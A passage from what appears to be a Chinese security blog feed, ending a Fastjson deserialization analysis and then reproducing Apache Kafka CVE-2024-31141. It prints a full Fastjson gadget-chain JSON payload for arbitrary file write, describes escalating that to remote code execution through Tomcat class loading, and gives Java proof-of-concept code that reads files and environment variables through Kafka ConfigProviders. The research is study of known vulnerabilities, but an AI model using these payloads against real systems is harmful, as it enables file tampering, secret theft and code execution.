src="https://s2.loli.net/2024/12/06/cYSRWoUDg19bJaq.png"></p><p>跟进find方法可以发现，这里先把 delegate 输入流的字节码转成 int 数组，然后拿 <code>ByteOrderMark</code>里的 bytes 挨个字节遍历去比对，如果遍历过程有比对错误的，<code>getBom</code>方法 就会返回<code>null</code>，如果遍历结束，没有比对错误那就会返回一个<code>ByteOrderMark</code>对象</p><p><img src="https://s2.loli.net/2024/12/06/YvrIkgVilx2AhZ4.png"></p><p>因此逐字节盲读取的关键差异点就在这里</p><p>最后输入流来源来自于<code>jdk.nashorn.api.scripting.URLReader</code>，<code>public URLReader(URL url)</code>可以传入一个 URL 对象。这就意味着 file jar http 等协议都可以使用。这里传入了file协议用于列举目录</p><h2 id="write"><a href="#write" class="headerlink" title="write"></a>write</h2><p>然后分析一下任意文件写的payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.io.InputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.AutoCloseInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;in&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.CharSequenceInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;cs&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.String&quot;</span></span><br><span class="line">          <span class="string">&quot;$&#123;shellcode&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;charset&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iso-8859-1&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> $<span class="punctuation">&#123;</span>size<span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.output.WriterOutputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;writer&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.output.LockableFileWriter&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;file2write&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;charset&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iso-8859-1&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;append&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">          <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;charset&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iso-8859-1&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;writeImmediately&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.io.InputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.ReaderInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;reader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;inputStream&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.a&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iso-8859-1&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;charsetName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;iso-8859-1&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;bufferSize&quot;</span><span class="punctuation">:</span> <span class="number">1024</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;c&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里和blackhat的议题提到的也有很多共通之处，都是利用<code>org.apache.commons.io.input.TeeInputStream#read()</code>方法来写入数据</p><p><img src="https://s2.loli.net/2024/12/06/PyQw8an1jANZiKD.png"></p><p>其中的一些细节可以参考</p><p><a href="https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg">Fastjson 1.2.68 反序列化漏洞 Commons IO 2.x 写文件利用链挖掘分析</a></p><p>但是这里作者似乎找到了一个更好的链子规避blackhat议题中原Poc链子中存在的写入缓冲区的8192字节限制</p><p><img src="https://s2.loli.net/2024/12/06/vybF63gZr5WcBtK.png"></p><p><img src="https://s2.loli.net/2024/12/06/i385Ns6QWzLGV7d.png"></p><h2 id="write2RCE"><a href="#write2RCE" class="headerlink" title="write2RCE"></a>write2RCE</h2><p>然后需要讨论的就是如何在任意文件写入的情况下RCE</p><p><a href="https://mrwq.github.io/aggregate-paper/butian/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%88%B0RCE/">https://mrwq.github.io/aggregate-paper/butian/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%88%B0RCE/</a></p><p><a href="https://landgrey.me/blog/22/">Spring Boot Fat Jar 写文件漏洞到稳定 RCE 的探索</a></p><p>常见的做法比如覆盖charsets.jar就是利用jvm的懒加载，覆盖<font style="color:rgb(74, 81, 83);">JDK HOME 目录下原有的 jar中</font>未被加载的charsets.jar包。但这个做法需要事先知道 JDK HOME 的目录路径，并且需要root权限。而且需要针对目标服务jdk版本准备恶意charsets.jar文件，否则可能影响正常服务；又比如利用类加载，在jdk home目录下向classes目录写入恶意class文件，然后利用fastjson的<code>@type</code>触发类加载即可RCE</p><p>这里作者也是利用了类加载，不过这里换了一个新的类加载口子</p><p>在fastjson反序列化过程中，针对不在黑白名单，并且缓存中没有的类会通过<code>com.alibaba.fastjson.util.TypeUtils#loadClass()</code>尝试加载类，其中会通过通过<code>TomcatEmbeddedWebappClassLoader</code>类加载器加载类</p><p><img src="https://s2.loli.net/2024/12/06/yjiV3t7FDRwpx9z.png"></p><p>根据双亲委派机制会委派<code>WebappClassLoaderBase</code>来加载，一路跟下去可以发现在<code>org.apache.catalina.loader.WebappClassLoaderBase#findClass</code>中会调用<code>org.apache.catalina.loader.WebappClassLoaderBase#findClassInternal</code>方法来寻找内部类</p><p><img src="https://s2.loli.net/2024/12/06/Kw93dtihj1lrUbz.png"></p><p>跟进<code>findClassInternal</code></p><p><img src="https://s2.loli.net/2024/12/06/op6Bkv4KFyXPWdH.png"></p><p>进一步跟进<code>org.apache.catalina.webresources.StandardRoot#getClassLoaderResource</code>跟踪类加载路径</p><p><img src="https://s2.loli.net/2024/12/06/6NYIJHn8te5VU1m.png"></p><p><img src="https://s2.loli.net/2024/12/06/4dE2QITebDiFmA1.png"></p><p>这里会判断<code>isCachingAllowed()</code>，而属性<code>cachingAllowed</code>默认为true</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isCachingAllowed</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.cachingAllowed;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/06/pFwBZAL3VOdE42m.png"></p><p>所以进到<code>org.apache.catalina.webresources.Cache#getResource</code>方法</p><p><img src="https://s2.loli.net/2024/12/06/Ql8PvtHAC26RWFT.png"></p><p>首先调用noCache方法，很明显这里会返回true，从而调用到<code>this.root.getResourceInternal(path, useClassLoaderResources)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">noCache</span><span class="params">(String path)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> path.endsWith(<span class="string">&quot;.class&quot;</span>) &amp;&amp; (path.startsWith(<span class="string">&quot;/WEB-INF/classes/&quot;</span>) || path.startsWith(<span class="string">&quot;/WEB-INF/lib/&quot;</span>)) || path.startsWith(<span class="string">&quot;/WEB-INF/lib/&quot;</span>) &amp;&amp; path.endsWith(<span class="string">&quot;.jar&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进<code>org.apache.catalina.webresources.StandardRoot#getResourceInternal</code></p><p><img src="https://s2.loli.net/2024/12/06/UIC9luhJn8txDev.png"></p><p>就可以发现这个类加载路径</p><p><img src="https://s2.loli.net/2024/12/06/n31oU8SBHftCmLJ.png"></p><p>如果这个class文件存在就会正常返回该文件资源，然后恶意类加载达到RCE</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>好复杂好复杂，结合三篇议题ppt才能微懂</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> security </tag>
            
            <tag> fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Kafka CVE-2024-31141学习</title>
      <link href="/2024/12/08/Apache%20Kafka%20CVE-2024-31141%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/12/08/Apache%20Kafka%20CVE-2024-31141%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p><a href="https://advisories.gitlab.com/pkg/maven/org.apache.kafka/kafka-clients/CVE-2024-31141/">CVE-2024-31141: Apache Kafka Clients: Privilege escalation to filesystem read-access via automatic ConfigProvider</a></p><h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p><font style="color:rgb(55, 65, 81);">Apache Kafka 客户端接受配置数据以自定义行为，并包含 ConfigProvider 插件以操作这些配置。 Apache Kafka 还提供 FileConfigProvider、DirectoryConfigProvider 和 EnvVarConfigProvider 实现，其中包括从磁盘或环境变量读取的功能。在 Apache Kafka 客户端配置可以由不受信任方指定的应用程序中，攻击者可以使用这些 ConfigProvider 读取磁盘和环境变量的任意内容。</font></p><p><font style="color:rgb(55, 65, 81);">此问题影响 Apache Kafka 客户端：从 2.3.0 到 3.5.2、3.6.2、3.7.0。</font></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>根目录下创建1.properties文件</p><p><img src="https://s2.loli.net/2024/12/08/5kJXZ3oTtfNCcE2.png"></p><p>然后配置客户端连接的配置项，在真实场景下存在于kafka客户端可控自定义配置的场景</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.kafka.clients.producer.KafkaProducer;</span><br><span class="line"><span class="keyword">import</span> org.apache.kafka.clients.producer.Producer;</span><br><span class="line"><span class="keyword">import</span> org.apache.kafka.common.config.provider.FileConfigProvider;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Properties</span> <span class="variable">providers</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">        providers.put(<span class="string">&quot;bootstrap.servers&quot;</span>, <span class="string">&quot;localhost:9092&quot;</span>);</span><br><span class="line">        providers.put(<span class="string">&quot;key.serializer&quot;</span>,<span class="string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);</span><br><span class="line">        providers.put(<span class="string">&quot;value.serializer&quot;</span>,<span class="string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);</span><br><span class="line">        providers.put(<span class="string">&quot;config.providers&quot;</span>, <span class="string">&quot;x&quot;</span>);</span><br><span class="line">        providers.put(<span class="string">&quot;config.providers.x.class&quot;</span>, FileConfigProvider.class.getName());</span><br><span class="line">        providers.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;$&#123;x:/1.properties:password&#125;&quot;</span>);</span><br><span class="line">        Producer&lt;String, String&gt; producer = <span class="keyword">new</span> <span class="title class_">KafkaProducer</span>&lt;&gt;(providers);</span><br><span class="line">        producer.initTransactions();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/08/E58nRBJ9dDjKSFg.png"></p><p>可以看到这里成功读取properties文件内容，存入到对象中，在后续处理或日志处理中可能会泄露出来</p><p>类似的还可以获取环境变量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.kafka.clients.producer.KafkaProducer;</span><br><span class="line"><span class="keyword">import</span> org.apache.kafka.clients.producer.Producer;</span><br><span class="line"><span class="keyword">import</span> org.apache.kafka.common.config.provider.EnvVarConfigProvider;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EnvVarConfigProviderTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Properties</span> <span class="variable">providers</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">        providers.put(<span class="string">&quot;bootstrap.servers&quot;</span>, <span class="string">&quot;localhost:9092&quot;</span>);</span><br><span class="line">        providers.put(<span class="string">&quot;key.serializer&quot;</span>,<span class="string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);</span><br><span class="line">        providers.put(<span class="string">&quot;value.serializer&quot;</span>,<span class="string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);</span><br><span class="line">        providers.put(<span class="string">&quot;config.providers&quot;</span>, <span class="string">&quot;x&quot;</span>);</span><br><span class="line">        providers.put(<span class="string">&quot;config.providers.x.class&quot;</span>, EnvVarConfigProvider.class.getName());</span><br><span class="line">        providers.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;$&#123;x::USERDOMAIN_ROAMINGPROFILE&#125;&quot;</span>);</span><br><span class="line">        Producer&lt;String, String&gt; producer = <span class="keyword">new</span> <span class="title class_">KafkaProducer</span>&lt;&gt;(providers);</span><br><span class="line">        producer.initTransactions();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/08/c1sRTlaL9qge2Kf.png"></p><p><img src="https://s2.loli.net/2024/12/08/zJEwm36hcXprOnZ.png"></p><p><font style="color:rgb(55, 65, 81);">DirectoryConfigProvider</font>本以为是可以列目录，结果是文件读取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.kafka.clients.producer.KafkaProducer;</span><br><span class="line"><span class="keyword">import</span> org.apache.kafka.clients.producer.Producer;</span><br><span class="line"><span class="keyword">import</span> org.apache.kafka.common.config.provider.DirectoryConfigProvider;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DirectoryConfigProviderTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Properties</span> <span class="variable">providers</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">        providers.put(<span class="string">&quot;bootstrap.servers&quot;</span>, <span class="string">&quot;localhost:9092&quot;</span>);</span><br><span class="line">        providers.put(<span class="string">&quot;key.serializer&quot;</span>,<span class="string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);</span><br><span class="line">        providers.put(<span class="string">&quot;value.serializer&quot;</span>,<span class="string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);</span><br><span class="line">        providers.put(<span class="string">&quot;config.providers&quot;</span>, <span class="string">&quot;x&quot;</span>);</span><br><span class="line">        providers.put(<span class="string">&quot;config.providers.x.class&quot;</span>, DirectoryConfigProvider.class.getName());</span><br><span class="line">        providers.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;$&#123;x:/:1.properties&#125;&quot;</span>);</span><br><span class="line">        Producer&lt;String, String&gt; producer = <span class="keyword">new</span> <span class="title class_">KafkaProducer</span>&lt;&gt;(providers);</span><br><span class="line">        producer.initTransactions();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/08/jzh5cHRitOb6ake.png"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p><a href="https://github.com/apache/kafka/blob/trunk/clients/src/main/java/org/apache/kafka/common/config/AbstractConfig.java#L65">kafka&#x2F;clients&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;apache&#x2F;kafka&#x2F;common&#x2F;config&#x2F;AbstractConfig.java at trunk · apache&#x2F;kafka</a></p><p>根据漏洞通告可以发现和<code>org.apache.kafka.automatic.config.providers</code>有关</p><p>在github的apache kafka仓库可以搜索到相关代码</p><p>跟踪<code>AUTOMATIC_CONFIG_PROVIDERS_PROPERTY</code>，可以在这个附近找到很多的代码</p><p><a href="https://github.com/apache/kafka/blob/trunk/clients/src/test/java/org/apache/kafka/common/config/AbstractConfigTest.java#L526">kafka&#x2F;clients&#x2F;src&#x2F;test&#x2F;java&#x2F;org&#x2F;apache&#x2F;kafka&#x2F;common&#x2F;config&#x2F;AbstractConfigTest.java at trunk · apache&#x2F;kafka</a></p><p>他们似乎都使用了<code>$&#123;a:b:c&#125;</code>的格式在读取配置项，因为很多文件路径形式</p><p>继续根据通告中所说的<code>Apache Kafka also provides FileConfigProvider, DirectoryConfigProvider, and EnvVarConfigProvider implementations which include the ability to read from disk or environment variables.</code></p><p>结合源码看看实现</p><p><code>org.apache.kafka.common.config.provider.FileConfigProvider#get(java.lang.String, java.util.Set&lt;java.lang.String&gt;)</code>可以发现文件读取的位置</p><p><img src="https://s2.loli.net/2024/12/08/8qWQiDAf6nZexSM.png"></p><p>给这个类的函数加上断点调试</p><p>可以发现在实例化解析配置项过程中调用<code>org.apache.kafka.common.config.AbstractConfig#instantiateConfigProviders</code>解析configProvider的内容</p><p>这里会调用<code>provider.configure</code>方法，这里provider的类名指向FileConfigProvider</p><p><img src="https://s2.loli.net/2024/12/08/BIki1ASgsH9Ou6c.png"></p><p>于是调用到<code>org.apache.kafka.common.config.provider.FileConfigProvider#configure</code>无事发生，继续调试，可以发现调用了<code>org.apache.kafka.common.config.ConfigTransformer#transform</code>来解析不是直接的变量，<img src="https://s2.loli.net/2024/12/08/ylNEzorYSfXHgZb.png"></p><p>可以发现满足这个正则匹配即可进行解析<code>\$\&#123;([^&#125;]*?):(([^&#125;]*?):)?([^&#125;]*?)\&#125;</code></p><p><img src="https://s2.loli.net/2024/12/08/XwBDZy45jmRSu3s.png"></p><p><code>$&#123;a:b:c&#125;</code>被解析为了<code>providerName</code>、<code>path</code>、<code>variable</code></p><p><img src="https://s2.loli.net/2024/12/08/6ErvfhBRuXP5T4d.png"></p><p>调试到这里可以发现，调用到了文件读取的地方</p><p><img src="https://s2.loli.net/2024/12/08/QiTbB1xdJGXDvLq.png"></p><p><img src="https://s2.loli.net/2024/12/08/7ULVpEG13SMPuFT.png"></p><p>类似的，获取环境变量这里主要分析<code>org.apache.kafka.common.config.provider.EnvVarConfigProvider#get(java.lang.String, java.util.Set&lt;java.lang.String&gt;)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ConfigData <span class="title function_">get</span><span class="params">(String path, Set&lt;String&gt; keys)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (path != <span class="literal">null</span> &amp;&amp; !path.isEmpty()) &#123;</span><br><span class="line">        log.error(<span class="string">&quot;Path is not supported for EnvVarConfigProvider, invalid value &#x27;&#123;&#125;&#x27;&quot;</span>, path);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConfigException</span>(<span class="string">&quot;Path is not supported for EnvVarConfigProvider, invalid value &#x27;&quot;</span> + path + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (keys == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ConfigData</span>(<span class="built_in">this</span>.filteredEnvVarMap);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Map&lt;String, String&gt; filteredData = <span class="keyword">new</span> <span class="title class_">HashMap</span>(<span class="built_in">this</span>.filteredEnvVarMap);</span><br><span class="line">        filteredData.keySet().retainAll(keys);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ConfigData</span>(filteredData);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>·根据这段代码逻辑可以看出，path要为空不然会报错退出，而keys不为空时则根据keys从环境变量中查找对应的环境变量，如果keys为空则返回所有环境变量，于是可以构造payload为<code>$&#123;x::key_name&#125;</code>或者<code>$&#123;x::&#125;</code></p><p>顺便提一嘴，这里<code>EnvVarConfigProvider#configure</code>方法和<code>FileConfigProvider#configure</code>倒是不太一样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">configure</span><span class="params">(Map&lt;String, ?&gt; configs)</span> &#123;</span><br><span class="line">    Pattern envVarPattern;</span><br><span class="line">    <span class="keyword">if</span> (configs.containsKey(<span class="string">&quot;allowlist.pattern&quot;</span>)) &#123;</span><br><span class="line">        envVarPattern = Pattern.compile(String.valueOf(configs.get(<span class="string">&quot;allowlist.pattern&quot;</span>)));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        envVarPattern = Pattern.compile(<span class="string">&quot;.*&quot;</span>);</span><br><span class="line">        log.info(<span class="string">&quot;No pattern for environment variables provided. Using default pattern &#x27;(.*)&#x27;.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.filteredEnvVarMap = (Map)<span class="built_in">this</span>.envVarMap.entrySet().stream().filter((envVar) -&gt; &#123;</span><br><span class="line">        <span class="keyword">return</span> envVarPattern.matcher((CharSequence)envVar.getKey()).matches();</span><br><span class="line">    &#125;).collect(Collectors.toMap(Map.Entry::getKey, Map.Entry::getValue));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以用来限制允许获取的环境变量</p><p>继续分析<code>org.apache.kafka.common.config.provider.DirectoryConfigProvider#get(java.lang.String, java.util.function.Predicate&lt;java.nio.file.Path&gt;)</code>可以发现这个感觉更厉害，经过调试加尝试可以发现<code>$&#123;a:b:c&#125;</code>的格式被解析为<code>$&#123;providerName:path:filename&#125;</code>，并且可以读取任意文件内容，而不是局限于类似properties文件的键值对内容</p><p><img 